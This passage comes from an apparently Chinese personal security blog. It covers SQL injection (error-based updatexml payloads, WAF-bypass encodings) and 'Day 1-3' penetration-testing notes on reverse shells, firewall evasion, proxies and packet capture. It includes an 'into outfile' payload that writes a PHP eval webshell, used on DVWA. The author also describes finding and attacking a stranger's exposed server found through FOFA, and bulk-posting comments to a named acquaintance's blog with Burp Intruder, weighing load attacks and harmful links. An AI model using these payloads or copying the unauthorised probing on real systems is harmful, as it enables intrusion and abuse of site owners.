<p>通过登录进去的信息可以猜测，系统后端是不是对http header里面的数据进行了获取，可能也进行了相 关数据库的操作。我们来看一下刚才的抓包，将它发送到Repeater里面，将User-Agent的值删掉，自己 构造一个，还是按照之前的思路，先输入一个单引号：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710101424266.png" alt="image-20240710101424266"></p>
<p>这个时候发现引发了报错，因此这里基本确定了这里存在http header注入漏洞了，合理猜测数据库使用了insert（）函数进行处理，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure>

<p>这里开始解释这个payload</p>
<h3><span id="详细解释">详细解释</span></h3><h4><span id="1-sql-注入和报错利用">1. SQL 注入和报错利用</span></h4><p>SQL 注入攻击不仅仅是为了修改或读取数据，还可以通过触发错误来泄露数据库内部信息。通过这种方法，攻击者可以获得数据库的架构信息、版本信息等。</p>
<h4><span id="2-updatexml-函数的使用">2. <code>updatexml</code> 函数的使用</span></h4><p><code>updatexml</code> 是一个 MySQL 函数，通常用于处理 XML 数据。当它的参数不合法时，会触发错误消息。攻击者可以利用这一点，将有用的信息嵌入到错误消息中。</p>
<h4><span id="3-报错示例">3. 报错示例</span></h4><p>假设你的 SQL 查询如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql</span><br><span class="line">复制代码</span><br><span class="line">INSERT INTO logs (user_agent) VALUES (&#x27;&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>其中 <code>updatexml(1,concat(0x7e,database()),0)</code> 部分会触发错误，因为 <code>updatexml</code> 期望的是 XML 文档，但这里传入的是不合法的参数 <code>1</code>。因此，MySQL 会返回一个错误，错误消息中包含了 <code>concat(0x7e,database())</code> 的结果。</p>
<h3><span id="触发错误和提取信息">触发错误和提取信息</span></h3><p>当上述 SQL 查询执行时，由于 <code>updatexml</code> 函数的参数不合法，MySQL 会生成错误消息。错误消息中将包含 <code>concat(0x7e,database())</code> 的结果，其中 <code>0x7e</code> 是 ASCII 码 <code>~</code>，而 <code>database()</code> 函数返回当前数据库的名称。</p>
<p>错误消息可能类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~current_database_name&#x27;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，错误消息泄露了当前数据库的名称 <code>current_database_name</code>。</p>
<h3><span id="为什么需要or">为什么需要<code>or</code></span></h3><p><code>or</code>在这里的主要作用是确保注入的代码在逻辑上总是会被评估并执行。即使前面的条件为假（例如空字符串），<code>or</code>会导致SQL引擎继续评估后面的条件。在这个特定的payload中，<code>updatexml</code>函数被设计为引发错误，从而泄露数据库名称。</p>
<h1><span id="从mysql注入到getshell">从MYSQL注入到GetShell</span></h1><p>Mysql支持向外写文件,这里的外指的是服务器的外部,需要用到</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">into</span> outfile</span><br></pre></td></tr></table></figure>

<p>这个命令的作用是将被选择的一行代码写入一个文件中,文件被创建到服务器上,</p>
<p><strong>其中 select into outfile的使用前提是</strong></p>
<p>(1)要知道网站的绝对路径,可以通过开源程序,报错,phpinfo,404页面等一些方式做基本的信息收集</p>
<p>(2)对目录要有写权限,一般image之类的存放图片的目录y欧写入权限</p>
<p>(3)要有mysql file权限,即(能否对系统的文件读取和写操作),默认情况下只有root权限有, <strong>WARING:写的文件名一定是在网站中不存在的,不然会失败</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,&quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/shell2.php</span><br></pre></td></tr></table></figure>

<p>在DVWA Low等级的SQL injection中如此输入,后续访问对应的网站目录,可以发现成功注入,并通过蚁剑弹shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710103522276.png" alt="image-20240710103522276"></p>
<h1><span id="sql注入绕过">SQL注入绕过</span></h1><p>绕过的姿势很多,这里介绍几种</p>
<h2><span id="大小写绕过">大小写绕过</span></h2><p>用于只针对于小写或大写的关键字匹配技术,正则表达式&#x2F;express&#x2F;i 表达大小写不敏感,即无法绕过,这是最简单的绕过方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h2><span id="替换关键字">替换关键字</span></h2><p>一般情况下大小写转换无法绕过,而且正则表达式会替换或山粗和select,union这些比较危险的关键字,如果只匹配一次–(也就是不做二次校验,只删去一层危险关键字便通过用户的操作)–只需要<strong>双写关键字</strong>就很容易绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">举例：z.com<span class="operator">/</span>index.php?page_id<span class="operator">=</span><span class="number">-15</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2><span id="使用编码">使用编码</span></h2><h3><span id="url编码">URL编码</span></h3><p>在浏览器中输入一个连接,浏览器会对非保留字符进行URL编码</p>
<p>空格-%20</p>
<p>单引号-%27</p>
<p>左右括号分别是%28 %29</p>
<p><strong>普通的URL编码可能无法实现绕过，需要结合实际场景来判断</strong></p>
<p><strong>比方说URL编码只进行了一次过滤，就可以再编码一次双重编码绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%2527id=1%252f%252a*/UNION%252f%252a%252a/SELECT</span><br></pre></td></tr></table></figure>

<p>首先，我们需要理解URL编码。<code>%25</code>是<code>%</code>的URL编码。因此，<code>%2527</code>解码后是<code>%27</code>，<code>%252f</code>解码后是<code>%2f</code>，<code>%252a</code>解码后是<code>%2a</code>。</p>
<h3><span id="解码后的payload">解码后的payload</span></h3><p>通过一次URL解码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">1%27id=1%2f%2a*/UNION%2f%2a%2a/SELECT</span><br></pre></td></tr></table></figure>

<p>再次URL解码后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;id=1/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>

<h3><span id="详细解析">详细解析</span></h3><ol>
<li>**<code>1&#39;</code>**：这是一个单引号，通常用于结束字符串字面值，打开可能的SQL注入点。</li>
<li>**<code>id=1</code>**：这是一个常规的条件部分，可能是为了符合预期的SQL查询语法。</li>
<li>**<code>/\*/UNION/\**/SELECT</code>**：这是注入的主要部分，其中使用了SQL注释语法<code>/* ... */</code>来插入注释。</li>
</ol>
<h3><span id="绕过防护机制">绕过防护机制</span></h3><ol>
<li><p><strong>注释绕过</strong></p>
<p><code>/*</code>和<code>*/</code>是SQL中的多行注释符号。攻击者利用这些注释符号来分割注入的关键字，使得简单的防护机制难以检测到关键字（如<code>UNION</code>和<code>SELECT</code>）的完整匹配。</p>
<p>在这个例子中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>

<p>这实际上是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ UNION / SELECT</span><br></pre></td></tr></table></figure>

<p>由于注释的存在，防护机制可能无法检测到完整的<code>UNION SELECT</code>关键字，从而绕过防护。</p>
</li>
</ol>
<h3><span id="十六进制编码">十六进制编码</span></h3><p>顾名思义用16进制转义</p>
<h2><span id="注释绕过">注释绕过</span></h2><h2><span id><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710104600689.png" alt="image-20240710104600689"></span></h2><h2><span id="等价函数与命令">等价函数与命令</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105238466.png" alt="image-20240710105238466"></p>
<h2><span id="特殊符号">特殊符号</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105608748.png" alt="image-20240710105608748"></p>
]]></content>
      <categories>
        <category>Application vulnerabilities</category>
      </categories>
      <tags>
        <tag>OWASP</tag>
      </tags>
  </entry>
  <entry>
    <title>从0开始的渗透Day1-3desu</title>
    <url>/2024/07/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1><span id="如读者有未授权渗透行为后果自负本站仅作学习用途">如读者有未授权渗透行为，后果自负，本站仅作学习用途</span></h1><h1><span id="day1基础入门-操作系统amp名词amp文件下载amp反弹shellamp防火墙绕过">Day1:基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹shell&amp;防火墙绕过</span></h1><h1><span id="名词解释">名词解释</span></h1><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
<h1><span id="文件下载">文件下载</span></h1><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<p><strong>在渗透的过程中，如果我们要在对方的服务里面下载我们制作好的病毒文件等，是不可能通过打开对方的浏览器进而进行下载的，因此弹出shell后我们也要掌握一些基本的文件下载命令，并且自己搭建一个小型的渗透站点用于传输一些安全脚本或者安全文件作为攻击手段。</strong></p>
<h1><span id="反弹shell">反弹shell</span></h1><p>反弹shell主要用于<strong>命令发送后无回显的情况</strong>，<strong>大部分 的安全工具都是一条命令发送过后便了无音讯</strong>，服务器接收了但并没有给我们对应的反馈，这个时候就需要反弹shell。</p>
<p>同时反弹shell能够解决一些需要交互式问答的命令的执行问题，一般情况下<strong>webshell是无法进一步验证我们的命令的</strong>，如果我们需要进行一些高权限的操作，这时服务器要求我们验证root权限，即使我们有root密码也是无济于事的，<strong>因为交互式命令的进一步交互并没有反馈到所谓的webshell这里</strong>，这个时候就更需要反弹shell了</p>
<h1><span id="防火墙绕过">防火墙绕过</span></h1><p>案例</p>
<h2><span id="1内网">1.内网：</span></h2><p>内网**–&gt;**xzb666-hub</p>
<p>xzb666-hub**!–&gt;**内网</p>
<p>这里的xzb666-hub可以代指类似本博客这样部署在公网上的站点</p>
<p>这块的监听可以用nc做实验，分别以xzb666-hub为代表的公网以及以虚拟机为代表的内网作为被监听端和监听端</p>
<p>发现此时监听成立，能够弹shell</p>
<p>但反过来，以xzb666-hubd为代表的公网想要监听内网是不成立的</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
<p>那么这就是一个很生草的问题了</p>
<p>下面我们来解释下这个问题</p>
<p>内网能够主动找到外网地址，但外网地址想要找内网地址却很难，下面扒取一段解释，可以作为参考</p>
<ol>
<li><p><strong>内网可以直接访问外网么？</strong></p>
<p>答案是<code>不能</code>，内网IP访问外网必须要通过路由器来中转 ，路由器只有连上了电信服务器，分配有外网IP才能访问外网。但内网通过路由器的中继是可以精准找到外网的。</p>
</li>
<li><p><strong>外网能否访问内网？</strong></p>
<p>答案是外网设备不能直接访问内网设备。这是因为内网（局域网）和外网（广域网）之间存在一个隔离层，通常由路由器或防火墙来维持。这种隔离是为了保护内网设备不受外部攻击和未经授权的访问</p>
<p>————————————————————————————————————</p>
<ol>
<li><strong>NAT（网络地址转换）</strong>：路由器通常使用NAT技术，将内网IP地址转换为外网IP地址。外部设备无法直接访问内网IP，因为这些IP在外网中是不可见的。</li>
<li><strong>防火墙</strong>：路由器或专用防火墙通常会阻止外部未授权的访问请求进入内网，以保护内网设备的安全。</li>
</ol>
<p>尽管如此，外网访问内网设备并非完全不可能。通过配置端口转发（Port Forwarding）或使用VPN（虚拟专用网络），你可以允许外部设备访问特定的内网设备或服务。不过，这些配置需要手动设置，并且通常仅用于特定用途，例如远程桌面访问或托管网络服务。</p>
<p>————————————————————————————————————</p>
<p><strong>如何解决外网无法访问内网的问题？</strong></p>
<p>端口映射</p>
<p>这个又叫虚拟映射，这个方法就是在连接外网的路由器上做一个端口映射的设置，具体说将访问该路由器外网地址和特定端口的服务映射到内网的一台电脑的某一个端口上。</p>
<p><strong>其实是很通俗易懂的,外网访问的过程中将流量转发到路由器上，（也就是我们百度直接搜ip时会弹出的ip–称为出口ip），然后我们选择一个端口。使这个端口又映射到内网主机的某个端口上实现流量从外网到内网主机的精准转发desu喵</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hfdyq4d43tj30u00u0q74.jpg" alt="img"></p>
<p>具体上面来说，<strong>就是在光猫+路由器上做一个虚拟映射的设置，例如，将访问122.15.244.39，端口10101的访问映射到192.168.2.2的端口10101上。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711112852515.png" alt="image-20240711112852515"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711112917706.png" alt="image-20240711112917706"></p>
<p>设置完成后，在外网浏览器输入：122.15.244.39:10101，则可以直接访问到服务器。<br>需要注意的是：<br>(1)<strong>公网映射时，选择的外部端口最好不选择常用的80，21等，因为路由器会屏蔽这些！！！</strong><br>(2) 服务器需要连接到包含公网IP的服务器上！</p>
<p><strong>如何获得公网IP</strong><br>实际当中，你的光猫+路由器的那个IP地址（可以在登录路由器界面后看到）不一定是公网IP，如果不是，则以上无法完成。因为IP地址很有限，所以很多运营商给你的是私网IP。例如，你看到你的那个地址是通过PPOE得来的，就是私有的。可以参见这里<a href="https://blog.csdn.net/hongkaihua1987/article/details/106046819%E3%80%82%E8%A6%81%E8%8E%B7%E5%BE%97%E5%85%AC%E7%BD%91IP%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%BE%E8%BF%90%E8%90%A5%E5%95%86%EF%BC%8C%E8%A6%81%E6%B1%82%E7%BB%99%E5%85%AC%E7%BD%91IP%EF%BC%8C%E4%BB%96%E4%BB%AC%E4%BC%9A%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%AE%BE%E7%BD%AE%EF%BC%8C%E8%AE%BE%E7%BD%AE%E5%AE%8C%E5%90%8E%E5%B0%B1%E6%98%AF%E5%85%AC%E7%BD%91%E7%9A%84%E4%BA%86%E3%80%82">https://blog.csdn.net/hongkaihua1987/article/details/106046819。要获得公网IP，可以找运营商，要求给公网IP，他们会在后台设置，设置完后就是公网的了。</a></p>
<p>**</p>
<p><strong>公网IP是动态的怎么办</strong><br>你的公网IP有了，但是他通常是动态的（登录路由器，如果是DHCP获得的，就是动态的）。所谓动态就是分给你的是变化的，当你路由器重新加电或复位后就会重新分配一个。这就有点傻了，总不能每次去查路由器吧。这里有两个办法：</p>
<p><strong>申请固定IP</strong><br>（1）找运营商，申请一个固定的公网IP。但是有个前提，运营商只对公司分配固定IP，对个人用户是不可以的。同时公司用户必须申请公司宽带，不能是个人宽带。公司宽带的资费要比个人的贵一些。同时，如果想要申请固定IP，还需要额外收一笔费用，按月计费。</p>
<p>转载自<a href="https://blog.csdn.net/kevinshift/article/details/122148573#31__25">从外网访问局域网服务器的六种方法_内部服务如何才能外部访问-CSDN博客</a></p>
<p>————————————————————————————————————</p>
</li>
<li><p><strong>路由器的作用是什么，什么是路由？</strong></p>
<p>比如说我们手机要访问<a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> ，必须先经过路由中转然后路由外网IP对<a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 发送请求，百度收到后对路由响应一个网页或者 数据之类的东东。</p>
<p>路由器接收到 <a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 的页面后，把页面发送给你的电脑或手机。路由器知道如何给这些信息指路，路由器就是一个指路人，这就是「路由」两个字的来历。</p>
<p>路，就是「必由之路」中的路。由，就是「必由之路」中的由（由是经过、缘由的意思）。所有的信息都要经过路由器，然后被指向一条它该去的路。<br>也就是说内网和外网就像两个隔绝的空间，无法互通，唯一的联通点就是路由器（因为路由器既有外网 IP 也有内网 IP），所以路由器有时候也被叫做「网关」，这个「关」是「一夫当关，万夫莫开」的「关」。如果路由器到电信的连接中断了，那么内网中所有的设备也就无法上网了。（这很好理解，相当于唯一一条出去的路断了）</p>
</li>
<li><p><strong>内网能访问内网么？</strong></p>
<p>内网中的设备可以互相访问（比如你可以用电脑或手机进入 <a href="https://link.zhihu.com/?target=http://192.168.1.1">http://192.168.1.1</a> 来查看你的路由器），但是不能直接访问外网，内网设备想要访问外网，就必须经过路由器中转。</p>
</li>
<li><p><strong>外网能访问外网么？</strong></p>
<p>外网中的设备可以互相访问（比如 <a href="https://link.zhihu.com/?target=http://qq.com">http://qq.com</a> 可以把首页发送给你的路由器，你的路由器有外网 IP），但是外网中的设备无法访问你的内网设备（这很好理解，内网是一个封闭的网络，外人进不来，所以实际上 <a href="https://link.zhihu.com/?target=http://qq.com">http://qq.com</a> 无法直接把首页放送给你的电脑和手机</p>
<p><strong>来源于<a href="https://zhuanlan.zhihu.com/p/34521011">HTTP访问要素：IP 与 端口 - 知乎 (zhihu.com)</a></strong></p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711110331630.png" alt="image-20240711110331630"></p>
<h2><span id="2防火墙">2.防火墙：</span></h2><p>xzb666-hub <strong>&lt;–&gt;</strong> aliyun</p>
<p>xzb666-hub防火墙 <strong>–&gt;</strong> aliyun</p>
<p>aliyun <strong>!- &gt;</strong> xzb666防火墙</p>
<p><strong>这里准备两台外网主机，查看两台主机之间是否能够正常通讯</strong> </p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711145047314.png" alt="image-20240711145047314"></p>
<p>也就是像现在这样，<strong>两台服务器之间通过nc建立了反弹shell的基本操作</strong></p>
<p>然后可以发现二者都可以充当监听端，被监听端.</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711151136536.png" alt="image-20240711151136536"></p>
<p><strong>当防火墙开启时，发现连接超时，说明入站的数据被严格过滤了，也就是说经过这一层防火墙的拦截，服务端哪怕成功被我们建立起监听也无法接收对应的弹shell等操作，也就是说吗，这里我们想要把cmd.exe弹过去想经过防火墙这一层简直是天方夜谭</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
<p>这也是个很生草的问题，因此我们开始用防火墙开发者的角度思考问题，便出现了一个奇妙的思路</p>
<p><strong>防火墙绕过-正向链接&amp;反向连接&amp;内网服务器</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711150850670.png" alt="image-20240711150850670"></p>
<p>防火墙有个特性，对入站的数据很严格，对出站的数据便放的很松，这类似于SQL注入中的一个分类，就是SQL二次注入的原理desu喵，<strong>假如我们通过服务端这里作为发出cmd.exe的对象，这时由于部署防火墙的服务端对出站的数据过滤的不是很严格，</strong>，因此shell成功被另一台外网主机所接收，这样的绕过也就可以实现了喵!!!</p>
<p><strong>所以以后碰上防火墙的部署的话，尽量让它出来找你而不是让你出来找它，让它主动把数据给你而不是你找它讨！这样卑微desu！</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hfdyq4d43tj30u00u0q74.jpg" alt="img"></p>
<h2><span id="有手就行的实战desu">有手就行的实战desu</span></h2><p>这里用fofa搜索对应的pikachu靶场，来打打同行（doge）</p>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQozfTZKNXRTR0quy3Ca3nmSgkKsfM76uQn_g&s" alt="永雏塔菲手机壁纸- 抖音"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711153357307.png" alt="image-20240711153357307"></p>
<p>然后这里打到了某个ip，发现功能齐全（阴险desu  打算开始做进一步入侵</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711153516754.png" alt="image-20240711153516754"></p>
<p>–后续不具体做展示desu</p>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQozfTZKNXRTR0quy3Ca3nmSgkKsfM76uQn_g&s" alt="永雏塔菲手机壁纸- 抖音"></p>
<h1><span id="day2web应用-架构搭建-漏洞-http数据包-代理服务器">Day2:Web应用-架构搭建-漏洞-HTTP数据包-代理服务器</span></h1><h1><span id="网站搭建前置知识">网站搭建前置知识</span></h1><p>#域名，子域名，DNS，HTTP&#x2F;HTTPS，证书等</p>
<p>第一步：准备域名，可以通过阿里云购买，服务器同理</p>
<p>PS：倘若域名没有经过备案，那么这个域名在运营过程中只能对大陆以外的服务器进行解析，这个时候服务器可以选择香港、新加坡等离国内较近的服务器desu，（备案是需要很长时间的，如果比较急的话就没必要）</p>
<p>第二步：将服务器基本配置配好过后，对域名进行解析，并利用阿里云自带的管理系统开始搭建网站</p>
<p>第三步：这个时候小白可以通过宝塔平台一键搭建网站</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712161427668.png" alt="image-20240712161427668"></p>
<h2><span id="一些进阶的参考资料">一些进阶的参考资料</span></h2><p><a href="https://blog.csdn.net/zhyl8157121/article/details/100551592">如何给你的网站套上Cloudflare（以阿里云为例）_如何套用cloudlfare-CSDN博客</a></p>
<h1><span id="web应用环境的架构">Web应用环境的架构</span></h1><p>理解不同WEB应用组成角色功能架：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712094332684.png" alt="image-20240712094332684"></p>
<p>不同的架构自然可能出现的安全漏洞不同</p>
<h1><span id="web安全漏洞分类">Web安全漏洞分类</span></h1><p>这里不过多赘述</p>
<p>但需要明白一个原理</p>
<p>如图的这些漏洞都是代码实现功能过程中代码不够完善从而出现的</p>
<h1><span id><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712094451574.png" alt="image-20240712094451574"></span></h1><p>同时，根据上述架构的分类：从语言上，中间件层面上，服务器操作系统等不同层面上都会出现一些安全问题。</p>
<h1><span id="http数据包和代理">HTTP数据包和代理</span></h1><p>图示是一个最基本的请求图示</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712095029242.png" alt="image-20240712095029242"></p>
<p>加入所谓的代理拦截后</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712095104496.png" alt="image-20240712095104496"></p>
<p>浏览器先传入代理，代理再传入服务器，对应的返回的过程也需要经过代理的中转。 </p>
<h2><span id="案例pax学长的评论区desu">案例–pax学长的评论区desu！！</span></h2><p><strong>比方说我们对某个网站点赞</strong></p>
<p>这里找到了pax学长的博客，随便点开一篇博文，发现其评论区功能正常运营，并且有点赞功能。Satoru打算套上Sherlock的马甲干点坏事情，发现Pax所用的butterfly框架甚至连头像都自动爬取上传好了（替你造马甲的框架，他真的，我哭死） 接下来准备进行对评论刷赞，看看是否成立</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712100613082.png" alt="image-20240712100613082"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712110446321.png" alt="image-20240712110446321"></p>
<p>这里对点赞请求进行抓包，本想通过User-Agent在不同的浏览器中对同一个id点赞，但发现由于token机制，以作者当前的水平想实现python脚本自动化抓取token是很困难的，因此转换另一个思路，抓取评论时的请求，通过Burp Intruder不断构造新的评论，开始炸库。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712111235234.png" alt="image-20240712111235234"></p>
<p>不断构造评论显然是可以实现的，毕竟是评论区自带的功能，不过利用这点依然是可以搞一些事情的</p>
<p>首先这个评论区功能是支持上传文件的，如果我上传一系列图片进去，是否有可能拖垮pax博客的负载？</p>
<p>同时这个马甲是支持信息伪造的，假设我传入一些有害网站作为个人马甲，这是否又是一层攻击？</p>
<p>再不济，我挂着Burp Intruder模块批量发包，积少成多的同时并且在pax的所有文章下发送一些无用信息，这只是拖累负载而已，但假设我传入的是有害的信息呢？这也是需要考虑的</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712111940495.png" alt="image-20240712111940495"></p>
<h1><span id="day3基础入门-抓包amp封包ampappamp小程序amppc应用ampweb应用">Day3:基础入门-抓包&amp;封包&amp;APP&amp;小程序&amp;PC应用&amp;Web应用</span></h1><h1><span id="学会对不同对象采用不同抓包封包抓取">学会对不同对象采用不同抓包封包抓取</span></h1><p>什么是抓包：</p>
<p>抓包就是抓取相关应用的一些数据，如果我们进行安全测试的话，有些应用的目标是会直接给到你的，但有些目标却是未知的</p>
<p>对于这些看不见的目标，我们可以通过抓取数据包来解决。</p>
<p>很经典的web流程，在任意一个浏览器通过F12打开网络（或者叫做networkl）</p>
<p>这个时候浏览器会起一个监听的进程，用于抓取基本的数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714153412205.png" alt="image-20240714153412205"></p>
<p>这就是很经典的一个单纯抓包，并没有对数据包做任何的额外操作。</p>
<p>同时对应的它也会展示一些加载的资源，比如前端展示的js或css等</p>
<p>还有一种可能，数据包是会被封装在微信小程序，app或者一些电脑的应用中，这个时候就需要一些专门的工具用于模拟对应的环境</p>
<h1><span id="抓包应用对象">抓包应用对象</span></h1><h2><span id="web应用站点网站">WEB应用站点（网站）</span></h2><p>浏览器审查查看元素网络监听</p>
<h2><span id="appamp小程序amppc抓包-httpx2fs数据-burpsuiteampcharlesampfiddler">APP&amp;小程序&amp;PC抓包-HTTP&#x2F;S数据  —Burpsuite&amp;Charles&amp;Fiddler</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境配置</span><br><span class="line">1、安卓模拟器安装搭建：</span><br><span class="line">雷电、逍遥、夜神等自行安装</span><br><span class="line">2、工具相关证书安装</span><br><span class="line">Burpsuite&amp;Charles&amp;Fiddler</span><br><span class="line">这三样工具看自己使用的是哪一样，对应的看工具官方手册或一些教程即可安装对应的证书</span><br><span class="line">3.封包抓取</span><br></pre></td></tr></table></figure>

<p>对应的记得安装证书，修改模拟器代理即可</p>
<p>在这里个人建议使用Charles配合Burpsuite，对小程序和app等进行抓包也可以直接配合手机使用，这里也有配套的教程.</p>
<h2><span id="程序进程amp网络接口amp其他协议抓包-wiresharkamp科来网络分析系统">程序进程&amp;网络接口&amp;其他协议抓包 – Wireshark&amp;科来网络分析系统</span></h2><p>当有一些程序走的是非web协议，这个时候burp和charles本质上是派不上用场的，这个时候我们也可以选择使用wireshark抓到类似UDP协议和IDMP协议等。</p>
<h2><span id="通讯类应用封包分析发送接收-wpe四件套封包amp科来网络分析系统">通讯类应用封包分析发送接收 –WPE四件套封包&amp;科来网络分析系统</span></h2><p>封包和抓包是两个本质不同的概念，对通讯类应用，比如游戏这类实时交互的进程，在不断产生流量交互的应用，使用对应的网络分析系统对本机的流量包进行分析，然后对协议的状态进行对应的观察</p>
<p>比方说<strong>打开模拟器，想要抓取某传奇手游的数据包</strong>。</p>
<p>这个时候利用科来网络分析系统对模拟器网段流量进行分析，可以通过TCP的状态发掘正在运行的进程，通过排除法（在模拟器中开始畅玩游戏（），发现相对较活跃的流量）可以发现当前运行的数据包中哪个是对应游戏的数据包喵</p>
<p><strong>类似这种游戏，一般走的都是TCP协议</strong>，因为HTTP使用请求-响应模型，客户端发送请求，服务器返回响应。因此HTTP模型适合于Web浏览中一次性数据获取的场景却不适用于游戏。</p>
<p>可能这个时候就会有人问了：SatoruSatoru，<strong>这哪里是Web渗透啊？分明就是抓包而已，这能有啥？</strong></p>
<p>Satoru这个时候就会说了：<strong>抓个包其实是很简单的事，但是拿到真实IP开始扫描资产，看看端口上其他的服务这种操作就要考虑的很多了（套用公式就是快）</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714210927280.png" alt="image-20240714210927280"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714210940142.png" alt="image-20240714210940142"></p>
<h2><span id="真正意义上的封包技术">真正意义上的封包技术</span></h2><p>详解wpe封包：</p>
<p>WPE是一个强大的网络封包编辑器，它可以截取网络上的信息，修改封包的数据，一般在安全测试中可以用来调试数据通讯的地址</p>
<p>封包指将网络传输过程中封片传输的数据，比方说一个游戏中，回城由十个数据包组成，那么WPE对我们发送的数据包进行整合封装，将分片传输的数据重新整合成一套数据包，然后重新发送，达到在游戏外实现功能的效果</p>
<h3><span id="封包概念解释">封包概念解释</span></h3><p><strong>封包（Packet）</strong> 是指在网络通信中，数据被分割成小块并通过网络传输的基本单位。每个封包通常包括头部（Header）和数据（Data）部分：</p>
<ul>
<li><strong>头部</strong>：包含控制信息，例如源地址、目的地址、序列号、协议信息等。</li>
<li><strong>数据</strong>：实际传输的数据内容。</li>
</ul>
<p>封包在网络中传输时，通过路由器和交换机等设备进行传递，最终到达目的地。封包技术是网络通信的基础，通过将大块数据分割成小块，可以实现高效和可靠的传输。</p>
